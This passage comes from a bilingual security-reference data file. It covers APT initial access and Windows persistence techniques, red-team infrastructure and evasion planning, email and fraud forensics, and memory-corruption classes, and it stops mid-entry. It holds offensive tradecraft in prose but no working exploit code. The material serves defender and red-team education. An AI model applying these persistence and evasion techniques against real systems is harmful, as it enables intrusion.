<div class="rs-rule"><strong>Faustregel</strong>Framework nach der Frage wählen, die du beantwortest, nicht nach Vertrautheit. STRIDE für Komponenten-Level-Threat-Enumeration. Attack-Tree für "ist X erreichbar". LINDDUN für Privacy. Diamond für Incident-Analyse. STRIDE für ein Incident-Write-up zu nutzen verschwendet Aufwand und produziert ein schlechtes Write-up.</div>
`
    ),
    phases: ["recon", "cves"]
  },
  {
    id: "apt-operations",
    domain: "threat-intelligence", tier: 3,
    title: T("APT Operations — Reference", "APT-Operationen — Referenz"),
    blurb: T(
      "How sustained adversaries operate end-to-end: initial-access patterns, tooling and TTP overlap, Windows persistence ranking, and the discovery/impact assessment workflow.",
      "Wie nachhaltige Adversaries durchgängig operieren: Initial-Access-Muster, Tooling- und TTP-Überlapp, Windows-Persistenz-Ranking und der Discovery-/Impact-Assessment-Workflow."
    ),
    body: B(
      `
<h2>Initial access — sustained vs opportunistic patterns</h2>
<ul>
  <li><strong>Spear-phishing against named individuals.</strong> Custom pretext, weeks of OSINT, targeting a single role (sysadmin, finance director) per campaign.</li>
  <li><strong>Supply-chain compromise.</strong> Compromise a vendor with access to the real target. Software-update injection (SolarWinds-class), code-signing-cert theft, dependency confusion in private package registry.</li>
  <li><strong>Public-facing app exploitation.</strong> n-day against unpatched edge devices (VPN appliances, mail gateways, firewalls). Ivanti, Citrix NetScaler, FortiGate, Pulse Secure — all repeatedly used by sustained actors.</li>
  <li><strong>Valid accounts.</strong> Purchased credentials, infostealer logs, prior breach reuse. Cheap, quiet, hard to attribute.</li>
  <li><strong>Trusted-relationship abuse.</strong> Compromise an MSP, ride their privileged access into multiple customers.</li>
</ul>

<h2>Windows persistence — ranked by observed APT preference</h2>
<ol>
  <li><strong>Scheduled task with COM trigger.</strong> Survives reboot, can run as SYSTEM, can be triggered by user logon. Defender sweeps Run keys first; tasks lag.</li>
  <li><strong>Service with binary path hijack.</strong> Legitimate service, attacker replaces ImagePath or binary. Survives restarts, runs SYSTEM.</li>
  <li><strong>WMI event subscription.</strong> <code>__EventFilter</code> + <code>__EventConsumer</code> + <code>__FilterToConsumerBinding</code>. Persistent, runs SYSTEM, often missed in autoruns scans.</li>
  <li><strong>Run / RunOnce keys.</strong> Classic. First place defender looks. Use as decoy if anything.</li>
  <li><strong>COM hijack.</strong> Register attacker DLL as CLSID handler. Triggers when any app instantiates that COM object.</li>
  <li><strong>BITS job.</strong> Background Intelligent Transfer Service job that downloads + executes. Long-lived, native, low-noise.</li>
  <li><strong>Image File Execution Options.</strong> "Debugger" key attached to e.g. notepad.exe — every notepad launch runs attacker binary first.</li>
  <li><strong>Group Policy preferences.</strong> Domain-wide persistence via GPO if attacker has Domain Admin. Most powerful, most detectable.</li>
  <li><strong>Office add-in / template.</strong> Word/Excel add-in or normal.dotm. Triggers on every Office launch.</li>
</ol>

<h2>Discovery + impact assessment without tipping the adversary</h2>
<ol>
  <li><strong>Read-only triage.</strong> No active sweeps. Pull EDR telemetry, network flow logs, DNS queries for the affected host. Don't touch the host.</li>
  <li><strong>Scope laterally from telemetry, not from scans.</strong> Match the host's authentication trail (Security Log 4624/4768 events) to identify other hosts the attacker may have touched.</li>
  <li><strong>Preserve evidence.</strong> Memory dump via covert means (live IR tool with low IOCs, or pull snapshot from hypervisor). Disk image after memory.</li>
  <li><strong>Identify objective.</strong> What was the adversary after? Active staging dirs, exfil DNS, beaconing destination tell you what to protect.</li>
  <li><strong>Plan eviction window.</strong> Eviction must be synchronous — kill C2 + reset credentials + rotate certs + revoke tokens all at the same time. Doing it sequentially gives the adversary time to re-establish.</li>
  <li><strong>Communicate sparingly.</strong> Only the IR team + named exec sponsor. Email about the incident travels through systems the adversary may control.</li>
</ol>

<h2>Attribution — overlap analysis</h2>
<ul>
  <li><strong>Tooling overlap.</strong> Specific custom backdoor families are reliably tied to specific actors (HAFNIUM China-Chopper variants, APT28 X-Agent, Sandworm Cyclops Blink). Public + open-source tooling (Cobalt Strike, Sliver) gives weak attribution.</li>
  <li><strong>Infrastructure overlap.</strong> C2 IP reuse, certificate reuse, hosting provider patterns. Single shared cert across two intrusions = strong link.</li>
  <li><strong>TTP overlap.</strong> Order of operations, characteristic command-line patterns, characteristic LOLBin choices.</li>
  <li><strong>Caveat.</strong> Attribution is a probabilistic claim. State "consistent with TTPs reported as X" not "is X". Public attribution prematurely is how vendors burn credibility.</li>
</ul>
<div class="rs-rule"><strong>Rule of thumb</strong>For sustained-adversary cases, don't run AV scans, don't run port scans, don't search the registry with admin tools. Each of those is a beacon to a live attacker that detection has occurred and they will adapt before you can evict. Telemetry-only triage, then synchronous eviction.</div>
`,
      `
<h2>Initial Access — nachhaltige vs opportunistische Muster</h2>
<ul>
  <li><strong>Spear-Phishing gegen namentlich genannte Personen.</strong> Custom-Pretext, Wochen OSINT, Targeting einer einzelnen Rolle (Sysadmin, Finance-Director) pro Kampagne.</li>
  <li><strong>Supply-Chain-Kompromittierung.</strong> Vendor mit Zugriff zum echten Ziel kompromittieren. Software-Update-Injection (SolarWinds-Klasse), Code-Signing-Cert-Diebstahl, Dependency-Confusion in privater Package-Registry.</li>
  <li><strong>Public-Facing-App-Exploitation.</strong> n-Day gegen ungepatchte Edge-Devices (VPN-Appliances, Mail-Gateways, Firewalls). Ivanti, Citrix NetScaler, FortiGate, Pulse Secure — alle wiederholt von nachhaltigen Actors genutzt.</li>
  <li><strong>Valid Accounts.</strong> Gekaufte Credentials, Infostealer-Logs, frühere Breach-Wiederverwendung. Billig, leise, schwer attribuierbar.</li>
  <li><strong>Trusted-Relationship-Missbrauch.</strong> Einen MSP kompromittieren, dessen privilegierten Zugriff in mehrere Kunden mitreiten.</li>
</ul>

<h2>Windows-Persistenz — gerankt nach beobachteter APT-Präferenz</h2>
<ol>
  <li><strong>Scheduled Task mit COM-Trigger.</strong> Überlebt Reboot, kann als SYSTEM laufen, kann durch User-Logon getriggert werden. Defender sweept Run-Keys zuerst; Tasks hängen hinterher.</li>
  <li><strong>Service mit Binary-Path-Hijack.</strong> Legitimer Service, Angreifer ersetzt ImagePath oder Binary. Überlebt Restarts, läuft SYSTEM.</li>
  <li><strong>WMI-Event-Subscription.</strong> <code>__EventFilter</code> + <code>__EventConsumer</code> + <code>__FilterToConsumerBinding</code>. Persistent, läuft SYSTEM, oft in Autoruns-Scans verpasst.</li>
  <li><strong>Run / RunOnce-Keys.</strong> Klassik. Erster Ort, an dem Defender schaut. Höchstens als Köder nutzen.</li>
  <li><strong>COM-Hijack.</strong> Angreifer-DLL als CLSID-Handler registrieren. Triggert, wenn irgendeine App das COM-Objekt instantiiert.</li>
  <li><strong>BITS-Job.</strong> Background-Intelligent-Transfer-Service-Job, der herunterlädt + ausführt. Langlebig, nativ, geräuscharm.</li>
  <li><strong>Image File Execution Options.</strong> "Debugger"-Key angehängt z.B. an notepad.exe — jeder notepad-Launch führt zuerst Angreifer-Binary aus.</li>
  <li><strong>Group-Policy-Preferences.</strong> Domain-weite Persistenz via GPO wenn Angreifer Domain-Admin hat. Mächtigste, detektierbarste.</li>
  <li><strong>Office-Add-In / Template.</strong> Word-/Excel-Add-In oder normal.dotm. Triggert bei jedem Office-Launch.</li>
</ol>

<h2>Discovery + Impact-Assessment ohne Adversary zu warnen</h2>
<ol>
  <li><strong>Read-Only-Triage.</strong> Keine aktiven Sweeps. EDR-Telemetrie, Network-Flow-Logs, DNS-Queries für betroffenen Host ziehen. Host nicht anfassen.</li>
  <li><strong>Lateral aus Telemetrie scopen, nicht aus Scans.</strong> Auth-Trail des Hosts (Security-Log 4624/4768-Events) matchen, um andere Hosts zu identifizieren, die der Angreifer berührt haben könnte.</li>
  <li><strong>Evidenz erhalten.</strong> Memory-Dump verdeckt (Live-IR-Tool mit niedrigen IOCs oder Snapshot vom Hypervisor). Disk-Image nach Memory.</li>
  <li><strong>Objektiv identifizieren.</strong> Worauf war der Adversary aus? Aktive Staging-Dirs, Exfil-DNS, Beaconing-Destination sagen dir was zu schützen ist.</li>
  <li><strong>Eviction-Fenster planen.</strong> Eviction muss synchron sein — C2 killen + Credentials resetten + Certs rotieren + Tokens revoken alles gleichzeitig. Sequenziell gibt dem Adversary Zeit, sich neu zu etablieren.</li>
  <li><strong>Sparsam kommunizieren.</strong> Nur IR-Team + benannter Exec-Sponsor. E-Mails über den Incident reisen durch Systeme, die der Adversary kontrollieren könnte.</li>
</ol>

<h2>Attribution — Overlap-Analyse</h2>
<ul>
  <li><strong>Tooling-Overlap.</strong> Spezifische Custom-Backdoor-Familien sind zuverlässig an spezifische Actors gebunden (HAFNIUM China-Chopper-Varianten, APT28 X-Agent, Sandworm Cyclops Blink). Public + Open-Source-Tooling (Cobalt Strike, Sliver) gibt schwache Attribution.</li>
  <li><strong>Infrastruktur-Overlap.</strong> C2-IP-Reuse, Certificate-Reuse, Hosting-Provider-Muster. Einzelnes geteiltes Cert über zwei Intrusionen = starker Link.</li>
  <li><strong>TTP-Overlap.</strong> Reihenfolge der Operationen, charakteristische Command-Line-Muster, charakteristische LOLBin-Wahlen.</li>
  <li><strong>Caveat.</strong> Attribution ist eine probabilistische Behauptung. "Konsistent mit als X gemeldeten TTPs" statt "ist X". Vorzeitige öffentliche Attribution ist, wie Vendors Glaubwürdigkeit verbrennen.</li>
</ul>
<div class="rs-rule"><strong>Faustregel</strong>Bei nachhaltigen Adversary-Fällen keine AV-Scans, keine Port-Scans, keine Registry-Suchen mit Admin-Tools. Jedes davon ist ein Signal an einen lebenden Angreifer, dass Detektion stattgefunden hat, und er passt sich an, bevor du evicten kannst. Nur Telemetrie-Triage, dann synchrones Evict.</div>
`
    ),
    phases: []
  },
  {
    id: "red-team-planning",
    domain: "threat-intelligence", tier: 3,
    title: T("Red Team Planning & Intel Analysis", "Red-Team-Planung & Intel-Analyse"),
    blurb: T(
      "Adversary-simulation planning tree (objective, profile, infrastructure, evasion, deconfliction) and the source-rating discipline that keeps a threat-intel report honest about confidence.",
      "Adversary-Simulations-Planungsbaum (Ziel, Profil, Infrastruktur, Evasion, Deconfliction) und die Quellenbewertungs-Disziplin, die einen Threat-Intel-Report ehrlich bei Konfidenz hält."
    ),
    body: B(
      `
<h2>Planning tree — objective</h2>
<ul>
  <li><strong>Objective &gt; activity.</strong> "Identify whether the SOC can detect domain enumeration from a foothold workstation within 4 hours" — concrete, measurable. Not "do red team things".</li>
  <li><strong>Defender behavior in scope.</strong> Detection, response, escalation, recovery. Pick which you're testing; trying to test all four at once produces no signal in any of them.</li>
  <li><strong>Success criteria written.</strong> "If alert fires within 4 hours: detection works. If alert fires but no host containment within 2 more hours: detection works, response doesn't." Each measurable.</li>
</ul>

<h2>Planning tree — actor profile</h2>
<ul>
  <li><strong>Pick a named actor.</strong> Simulating "APT29" gives the engagement a TTP set to follow. MITRE ATT&amp;CK Navigator maps named-actor-to-techniques.</li>
  <li><strong>Fidelity level.</strong> High = exact tooling, exact infrastructure pattern, exact dwell-time profile. Low = TTP set only, modern tools to execute them.</li>
  <li><strong>Don't mix.</strong> Simulating APT29's initial access with FIN7's lateral movement = unrepresentative. Stay within actor.</li>
</ul>

<h2>Planning tree — infrastructure</h2>
<ul>
  <li><strong>Domains.</strong> Aged-out (registered 6–12 months in advance), low-reputation neighbor-free, TLS-terminated with valid Let's Encrypt. Categorization by domain reputation services takes weeks; pre-register.</li>
  <li><strong>Redirectors.</strong> Domain-fronted or CDN-fronted to obscure true backend. nginx with location-block rules forwarding only specific paths to C2 backend.</li>
  <li><strong>Cloud staging.</strong> Disposable cloud VMs for each phase. Never reuse infrastructure across clients or across phases.</li>
  <li><strong>Mailbox infrastructure.</strong> If phishing: SPF/DKIM/DMARC-passing, warmed sender history before campaign, dedicated sending IP.</li>
</ul>

<h2>Planning tree — evasion budget</h2>
<ul>
  <li><strong>IOC budget.</strong> "5 EDR alerts maximum across engagement; 0 SOC escalations". Track in real time. Above budget = pause, reassess.</li>
  <li><strong>Tradecraft choice ties to budget.</strong> nanodump on LSASS (low IOC) vs Mimikatz (high IOC) is a budget decision, not a capability one.</li>
  <li><strong>Operator log of every action.</strong> Each command + timestamp + reasoning. Required for post-engagement attribution of which alert tied to which action.</li>
</ul>

<h2>Planning tree — deconfliction</h2>
<ul>
  <li><strong>White cell contact.</strong> Named individual + phone + Signal + email, available 24/7 for the engagement window.</li>
  <li><strong>Deconfliction call template.</strong> "This is &lt;tester&gt; calling about an action expected to generate &lt;alert pattern&gt; at &lt;time window&gt;. Please confirm." Decide upfront: who initiates (tester or defender?) when SOC suspects a real intrusion mid-engagement.</li>
  <li><strong>Real-incident protocol.</strong> What happens if a real attacker appears during the engagement? Default: pause engagement, stand down, hand to IR.</li>
  <li><strong>Eviction protocol.</strong> What happens if defender catches and contains a foothold? Pause and brief, don't sneak around the containment.</li>
</ul>

<h2>Intel analysis — source discipline</h2>
<ul>
  <li><strong>Source rating.</strong> Tag each claim with source quality. Primary (saw it firsthand), Reliable secondary (vendor research with reproducible IoCs), Aggregated (collected from other reports), Rumor (single mention, no corroboration).</li>
  <li><strong>Confidence language.</strong> "We assess with high confidence" / "moderate confidence" / "low confidence" — pick one per claim. Avoid "likely" or "probably" without scale.</li>
  <li><strong>Cross-corroboration.</strong> Two independent sources confirming the same fact = high confidence. Two reports both citing the same earlier report = single source, not two.</li>
  <li><strong>Beware analytic momentum.</strong> Once a hypothesis is named, every subsequent observation gets fitted to it. Set explicit disconfirming evidence threshold before starting analysis.</li>
</ul>
<div class="rs-rule"><strong>Rule of thumb</strong>The red-team engagement that's hardest to plan well is the one without a clear objective. "Just test our security" produces a report the client can't act on. Demand a written, measurable objective; if the client can't articulate it, run a planning workshop before scoping the engagement.</div>
`,
      `
<h2>Planungsbaum — Ziel</h2>
<ul>
  <li><strong>Ziel &gt; Aktivität.</strong> "Identifizieren, ob der SOC Domain-Enumeration von einem Foothold-Workstation innerhalb 4 Stunden detektieren kann" — konkret, messbar. Nicht "Red-Team-Sachen machen".</li>
  <li><strong>Defender-Verhalten im Scope.</strong> Detektion, Response, Eskalation, Recovery. Wählen, was getestet wird; alle vier gleichzeitig zu testen produziert in keinem Signal.</li>
  <li><strong>Erfolgskriterien schriftlich.</strong> "Wenn Alert in 4 Stunden feuert: Detektion funktioniert. Wenn Alert feuert, aber kein Host-Containment in weiteren 2 Stunden: Detektion funktioniert, Response nicht." Jeweils messbar.</li>
</ul>

<h2>Planungsbaum — Actor-Profil</h2>
<ul>
  <li><strong>Benannten Actor wählen.</strong> "APT29" simulieren gibt dem Engagement ein TTP-Set zu folgen. MITRE ATT&amp;CK Navigator mappt Named-Actor-zu-Techniques.</li>
  <li><strong>Fidelity-Level.</strong> Hoch = exaktes Tooling, exaktes Infrastruktur-Muster, exaktes Dwell-Time-Profil. Niedrig = nur TTP-Set, moderne Tools zur Ausführung.</li>
  <li><strong>Nicht mischen.</strong> APT29-Initial-Access mit FIN7-Lateral-Movement simulieren = unrepräsentativ. Im Actor bleiben.</li>
</ul>

<h2>Planungsbaum — Infrastruktur</h2>
<ul>
  <li><strong>Domains.</strong> Aged-out (6–12 Monate im Voraus registriert), Low-Reputation-nachbarschaftsfrei, TLS-terminiert mit gültigem Let's Encrypt. Kategorisierung durch Domain-Reputation-Services dauert Wochen; vorregistrieren.</li>
  <li><strong>Redirectors.</strong> Domain-fronted oder CDN-fronted, um echtes Backend zu verschleiern. nginx mit Location-Block-Regeln, die nur spezifische Pfade an C2-Backend weiterleiten.</li>
  <li><strong>Cloud-Staging.</strong> Disposable Cloud-VMs für jede Phase. Niemals Infrastruktur über Kunden oder Phasen hinweg wiederverwenden.</li>
  <li><strong>Mailbox-Infrastruktur.</strong> Bei Phishing: SPF/DKIM/DMARC-passing, gewärmte Sender-History vor Kampagne, dedizierte Sending-IP.</li>
</ul>

<h2>Planungsbaum — Evasion-Budget</h2>
<ul>
  <li><strong>IOC-Budget.</strong> "Maximal 5 EDR-Alerts über Engagement; 0 SOC-Eskalationen". Echtzeit-Tracking. Über Budget = pause, neubewerten.</li>
  <li><strong>Tradecraft-Wahl an Budget gebunden.</strong> nanodump auf LSASS (low IOC) vs Mimikatz (high IOC) ist Budget-Entscheidung, keine Capability-Entscheidung.</li>
  <li><strong>Operator-Log jeder Aktion.</strong> Jedes Kommando + Timestamp + Begründung. Pflicht für Post-Engagement-Attribution welcher Alert zu welcher Aktion gehörte.</li>
</ul>

<h2>Planungsbaum — Deconfliction</h2>
<ul>
  <li><strong>White-Cell-Kontakt.</strong> Benannte Person + Telefon + Signal + E-Mail, 24/7 verfügbar im Engagement-Fenster.</li>
  <li><strong>Deconfliction-Call-Template.</strong> "Hier &lt;Tester&gt; bezüglich Aktion, die &lt;Alert-Muster&gt; um &lt;Zeitfenster&gt; erzeugen soll. Bitte bestätigen." Vorab klären: wer initiiert (Tester oder Verteidiger?), wenn SOC mitten im Engagement echte Intrusion vermutet.</li>
  <li><strong>Real-Incident-Protokoll.</strong> Was passiert, wenn echter Angreifer während Engagement auftaucht? Default: Engagement pausieren, zurücktreten, an IR übergeben.</li>
  <li><strong>Eviction-Protokoll.</strong> Was passiert, wenn Verteidiger Foothold fängt und contained? Pausieren und briefen, nicht um Containment herumschleichen.</li>
</ul>

<h2>Intel-Analyse — Quellen-Disziplin</h2>
<ul>
  <li><strong>Source-Rating.</strong> Jede Behauptung mit Source-Qualität taggen. Primär (selbst gesehen), zuverlässig sekundär (Vendor-Research mit reproduzierbaren IoCs), aggregiert (aus anderen Reports gesammelt), Gerücht (einzelne Erwähnung, keine Corroboration).</li>
  <li><strong>Konfidenz-Sprache.</strong> "Wir bewerten mit hoher Konfidenz" / "moderater Konfidenz" / "niedriger Konfidenz" — eines pro Behauptung. "Wahrscheinlich" oder "vermutlich" ohne Skala vermeiden.</li>
  <li><strong>Cross-Corroboration.</strong> Zwei unabhängige Quellen, die dasselbe Fakt bestätigen = hohe Konfidenz. Zwei Reports, die beide den gleichen früheren Report zitieren = eine Quelle, nicht zwei.</li>
  <li><strong>Vorsicht vor analytischem Momentum.</strong> Sobald eine Hypothese benannt ist, wird jede folgende Beobachtung auf sie gefittet. Vor Analysestart explizite Disconfirming-Evidence-Schwelle setzen.</li>
</ul>
<div class="rs-rule"><strong>Faustregel</strong>Das am schwersten gut zu planende Red-Team-Engagement ist das ohne klares Ziel. "Testet einfach unsere Sicherheit" produziert einen Report, mit dem der Kunde nicht arbeiten kann. Schriftliches, messbares Ziel fordern; kann der Kunde es nicht artikulieren, Planungsworkshop vor Scoping durchführen.</div>
`
    ),
    phases: []
  },
  {
    id: "email-and-fraud-forensics",
    domain: "threat-intelligence", tier: 3,
    title: T("Email & Fraud — Investigation Reference", "E-Mail- & Fraud — Untersuchungsreferenz"),
    blurb: T(
      "Triage workflow for a suspicious email (header reasoning, detonation, URL pivot) and the investigative routes for transaction fraud across account, device, and payment dimensions.",
      "Triage-Workflow für eine verdächtige E-Mail (Header-Analyse, Detonation, URL-Pivot) und investigative Routen für Transaktionsbetrug entlang Konto-, Geräte- und Zahlungsdimension."
    ),
    body: B(
      `
<h2>Email triage workflow</h2>
<ol>
  <li><strong>Pull original .eml.</strong> Forwarded copies lose headers. Ask user to "send as attachment" or pull from journaling.</li>
  <li><strong>Header reasoning.</strong>
    <ul>
      <li><code>Return-Path</code> vs <code>From</code> mismatch = display-name spoofing.</li>
      <li><code>Authentication-Results</code>: <code>spf=pass dkim=pass dmarc=pass</code> ideally; <code>dmarc=fail</code> = unauthorized sender even if SPF/DKIM individually pass.</li>
      <li><code>Received:</code> chain read bottom-up. First hop = actual sender IP. ASN of first hop tells you origin context.</li>
      <li><code>Message-ID</code> format often product-specific. Mismatched format + claimed sender = forged.</li>
    </ul>
  </li>
  <li><strong>URL pivot — characterize without tipping the operator.</strong>
    <ul>
      <li>Submit to urlscan.io, VirusTotal — these may notify operator. Use private modes if available.</li>
      <li>Pull via Tor or rotating residential proxy to avoid attacker's IP allow-list / one-time-use logic.</li>
      <li>Curl with non-standard UA first; many landing pages serve different content per UA to hide from sandboxes.</li>
    </ul>
  </li>
  <li><strong>Attachment detonation.</strong> Cuckoo / Hybrid Analysis / disposable VM. Office docs: <code>oletools</code> (<code>olevba</code>, <code>oleid</code>) for macros without executing.</li>
  <li><strong>Victim impact assessment.</strong> Did anyone click? <code>Set-MessageTrace</code> in Exchange Online or equivalent. URL click recorded by Safe Links if enabled. Credential entered = account-takeover protocol activates.</li>
  <li><strong>Containment.</strong> Org-wide quarantine via Exchange / Workspace transport rule using subject + sender pattern. Block URL at proxy + DNS sinkhole.</li>
</ol>

<h2>Fraud — account dimension</h2>
<ul>
  <li><strong>Login history.</strong> New geo, new device, impossible-travel (login from country A at 10:00, country B at 10:05).</li>
  <li><strong>Auth-method changes.</strong> 2FA disabled, password changed, recovery email/phone changed — all in short window = takeover signal.</li>
  <li><strong>Behavior baseline drift.</strong> Action mix (only viewed before, now bulk-exports), session length, time-of-day pattern.</li>
  <li><strong>Account-friend / referral abuse.</strong> Sudden new accounts created from this IP that all received a referral bonus from each other.</li>
</ul>

<h2>Fraud — device dimension</h2>
<ul>
  <li><strong>Device fingerprint continuity.</strong> Same canvas hash, audio context, font list, WebGL params = same browser. Sudden major changes mid-session = session hijack or new device.</li>
  <li><strong>Geolocation consistency.</strong> IP geo + browser timezone + OS locale should align. <code>Accept-Language: en-US</code> + IP in Russia + timezone +03:00 = suspicious.</li>
  <li><strong>Browser-attribute drift.</strong> User-Agent claims Windows 10 but JS detects macOS — bot/proxy.</li>
  <li><strong>TLS fingerprint (JA3/JA4).</strong> Most legit clients produce a small set of fingerprints. New JA4 from a known user account = different software talking.</li>
</ul>

<h2>Fraud — payment dimension</h2>
<ul>
  <li><strong>Velocity.</strong> N transactions per minute exceeding baseline. Per-user, per-card, per-IP, per-shipping-address.</li>
  <li><strong>BIN abuse.</strong> Card BIN from country mismatched to claimed billing address.</li>
  <li><strong>Shipping abuse.</strong> Same shipping address across many accounts; reshipper-known address.</li>
  <li><strong>3DS abuse.</strong> Forced-frictionless transactions (merchant accepts despite 3DS challenge failure).</li>
  <li><strong>Processor signals.</strong> Stripe Radar, Adyen RevenueProtect emit risk scores. Treat as input, not as truth.</li>
</ul>
<div class="rs-rule"><strong>Rule of thumb</strong>For email cases, the single most useful triage signal is the <code>Authentication-Results</code> header combined with the first-hop IP's ASN. For fraud cases, the single most useful signal is the JA4 TLS fingerprint joined to the account history. Train your triage muscle on those two.</div>
`,
      `
<h2>E-Mail-Triage-Workflow</h2>
<ol>
  <li><strong>Original .eml holen.</strong> Forwarded Kopien verlieren Header. User bitten "als Anhang senden" oder aus Journaling ziehen.</li>
  <li><strong>Header-Analyse.</strong>
    <ul>
      <li><code>Return-Path</code> vs <code>From</code> Mismatch = Display-Name-Spoofing.</li>
      <li><code>Authentication-Results</code>: ideal <code>spf=pass dkim=pass dmarc=pass</code>; <code>dmarc=fail</code> = unauthorisierter Sender, selbst wenn SPF/DKIM einzeln passen.</li>
      <li><code>Received:</code>-Chain bottom-up lesen. Erster Hop = tatsächliche Sender-IP. ASN des ersten Hops verrät Origin-Kontext.</li>
      <li><code>Message-ID</code>-Format oft produktspezifisch. Mismatched Format + behaupteter Sender = gefälscht.</li>
    </ul>
  </li>
  <li><strong>URL-Pivot — charakterisieren ohne Operator zu warnen.</strong>
    <ul>
      <li>Submit zu urlscan.io, VirusTotal — kann Operator benachrichtigen. Private Modes nutzen wenn verfügbar.</li>
      <li>Via Tor oder rotierendem Residential-Proxy ziehen, um Angreifer-IP-Allow-List / One-Time-Use-Logik zu umgehen.</li>
      <li>Curl mit Non-Standard-UA zuerst; viele Landing-Pages servieren UA-abhängigen Content, um sich vor Sandboxes zu verstecken.</li>
    </ul>
  </li>
  <li><strong>Attachment-Detonation.</strong> Cuckoo / Hybrid Analysis / disposable VM. Office-Docs: <code>oletools</code> (<code>olevba</code>, <code>oleid</code>) für Makros ohne Ausführung.</li>
  <li><strong>Victim-Impact-Assessment.</strong> Hat jemand geklickt? <code>Set-MessageTrace</code> in Exchange Online oder Äquivalent. URL-Click aufgezeichnet von Safe-Links wenn aktiv. Credential eingegeben = Account-Takeover-Protokoll aktiv.</li>
  <li><strong>Containment.</strong> Org-weiter Quarantine via Exchange-/Workspace-Transport-Rule mit Subject + Sender-Muster. URL am Proxy + DNS-Sinkhole blocken.</li>
</ol>

<h2>Fraud — Account-Dimension</h2>
<ul>
  <li><strong>Login-History.</strong> Neue Geo, neues Device, Impossible-Travel (Login aus Land A um 10:00, Land B um 10:05).</li>
  <li><strong>Auth-Methoden-Änderungen.</strong> 2FA deaktiviert, Passwort geändert, Recovery-E-Mail/-Phone geändert — alle in kurzem Fenster = Takeover-Signal.</li>
  <li><strong>Verhaltens-Baseline-Drift.</strong> Action-Mix (vorher nur gelesen, jetzt Bulk-Exports), Session-Länge, Time-of-Day-Muster.</li>
  <li><strong>Account-Friend-/Referral-Missbrauch.</strong> Plötzlich neue Accounts erstellt aus dieser IP, die alle Referral-Bonus voneinander erhielten.</li>
</ul>

<h2>Fraud — Device-Dimension</h2>
<ul>
  <li><strong>Device-Fingerprint-Kontinuität.</strong> Gleiches Canvas-Hash, Audio-Context, Font-Liste, WebGL-Params = gleicher Browser. Plötzliche Major-Änderungen mitten in Session = Session-Hijack oder neues Device.</li>
  <li><strong>Geolocation-Konsistenz.</strong> IP-Geo + Browser-Timezone + OS-Locale sollten zusammenpassen. <code>Accept-Language: en-US</code> + IP in Russland + Timezone +03:00 = verdächtig.</li>
  <li><strong>Browser-Attribut-Drift.</strong> User-Agent behauptet Windows 10, aber JS detektiert macOS — Bot/Proxy.</li>
  <li><strong>TLS-Fingerprint (JA3/JA4).</strong> Meiste legitime Clients produzieren ein kleines Fingerprint-Set. Neues JA4 von bekanntem User-Account = andere Software spricht.</li>
</ul>

<h2>Fraud — Payment-Dimension</h2>
<ul>
  <li><strong>Velocity.</strong> N Transaktionen pro Minute überschreiten Baseline. Per-User, per-Karte, per-IP, per-Shipping-Adresse.</li>
  <li><strong>BIN-Missbrauch.</strong> Karten-BIN aus Land mismatched zur behaupteten Billing-Adresse.</li>
  <li><strong>Shipping-Missbrauch.</strong> Gleiche Shipping-Adresse über viele Accounts; Reshipper-bekannte Adresse.</li>
  <li><strong>3DS-Missbrauch.</strong> Forced-Frictionless-Transaktionen (Merchant akzeptiert trotz 3DS-Challenge-Failure).</li>
  <li><strong>Processor-Signale.</strong> Stripe Radar, Adyen RevenueProtect emittieren Risk-Scores. Als Input behandeln, nicht als Wahrheit.</li>
</ul>
<div class="rs-rule"><strong>Faustregel</strong>Bei E-Mail-Fällen ist das einzige nützlichste Triage-Signal der <code>Authentication-Results</code>-Header kombiniert mit dem ersten Hop-IP-ASN. Bei Fraud ist es der JA4-TLS-Fingerprint gejoined mit Account-History. Den Triage-Muskel auf diese beiden trainieren.</div>
`
    ),
    phases: ["recon"]
  },

  // ─────────────────────────────────────────────────────────────
  // 06 — REVERSE, BINARY & MALWARE
  // ─────────────────────────────────────────────────────────────
  {
    id: "binary-exploitation-pipeline",
    domain: "reverse-malware", tier: 3,
    title: T("Binary Exploitation — Fuzz to Working Exploit", "Binär-Exploitation — von Fuzz zum funktionierenden Exploit"),
    blurb: T(
      "End-to-end memory-corruption pipeline: corruption classes, fuzzing-driven crash discovery, mitigation tradeoffs per stage, and the Windows internals that earn offensive relevance.",
      "End-to-End-Memory-Corruption-Pipeline: Korruptions-Klassen, Fuzzing-getriebene Crash-Discovery, Mitigations-Trade-offs pro Stufe und die Windows-Internals mit offensiver Relevanz."
    ),
    body: B(
      `
<h2>Corruption classes</h2>
<ul>
  <li><strong>Stack buffer overflow.</strong> Classic <code>strcpy</code> on stack array. Defenses: stack canary, ASLR, NX. Still exploitable with info-leak + ROP.</li>
  <li><strong>Heap buffer overflow.</strong> Overflow into adjacent chunk's metadata or into adjacent object's pointer/vtable. Modern hardened allocators (mimalloc, scudo, jemalloc with shadow chunks) raise the bar.</li>
  <li><strong>Use-after-free.</strong> Free, then dereference. Reclaim controlled data into the freed slot, fake vtable, hijack control flow on next virtual call. Mitigated by MarkUs / GarbageCollector-style allocators in browsers.</li>
  <li><strong>Type confusion.</strong> Object treated as different type than its actual layout. Common in JIT engines; primitive for arbitrary R/W via fake array length.</li>
  <li><strong>Double-free.</strong> Free same chunk twice; tcache or fastbin poisoning gives arbitrary write. glibc 2.27+ has tcache double-free check.</li>
  <li><strong>Integer overflow.</strong> <code>malloc(n * sizeof(x))</code> where <code>n * sizeof(x)</code> overflows; small allocation, large copy.</li>
  <li><strong>Format string.</strong> <code>printf(user_input)</code> with no format. <code>%n</code> writes; <code>%s</code> reads. Rare in modern code thanks to compiler warnings.</li>
</ul>

<h2>Fuzzing — discovery to triage</h2>
<ul>
  <li><strong>AFL++ for grey-box.</strong> Compile target with afl-cc; corpus seed → coverage-guided mutation. Add ASAN-instrumented build for cleaner crash signal.</li>
  <li><strong>libFuzzer for in-process.</strong> Per-function harness; faster per iteration than AFL. Best for library APIs.</li>
  <li><strong>Honggfuzz for kernel / hardware-assisted.</strong> Hardware perf-counter coverage. Good when source-level instrumentation isn't available.</li>
  <li><strong>Crash triage.</strong>
    <ul>
      <li>ASAN report → classification (heap-buffer-overflow, use-after-free, etc.).</li>
      <li>Minimize input — afl-tmin / libFuzzer's <code>-minimize_crash=1</code>.</li>
      <li>Reproduce under gdb / rr / time-travel debugger. <code>rr</code> particularly valuable: record once, walk forward and back to find root cause.</li>
      <li>Categorize: control-flow-hijackable, info-leak, DoS-only. Only the first two are primary exploitation targets.</li>
    </ul>
  </li>
</ul>

<h2>Exploitation pipeline — crash to working RCE</h2>
<ol>
  <li><strong>Establish primitives.</strong> Arbitrary read, arbitrary write, control of PC, control of stack pivot, control of a function pointer.</li>
